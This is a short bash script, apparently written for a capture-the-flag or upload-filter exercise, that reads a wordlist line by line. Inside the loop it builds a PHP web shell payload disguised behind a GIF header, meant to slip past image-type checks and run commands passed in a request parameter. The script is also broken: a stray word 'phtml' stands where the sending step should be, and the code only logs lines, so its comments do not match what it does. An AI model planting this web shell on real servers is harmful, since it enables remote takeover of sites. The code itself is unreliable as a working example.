#!/bin/bash
# Usage: ./flag_type_filter.sh wordlist.txt output.txt

input=$1
output=$2

while IFS= read -r line
do
    echo "Processing: $line"
    # Include Content-Type: image/gif and send payload
    payload="GIF8\n<?php system(\$_REQUEST['cmd']); ?>"
    phtml

    # Optionally log the line to the output file if needed
    echo "$line" >> "$output"
done < "$input"

echo "Process complete. Lines processed are saved to $output."
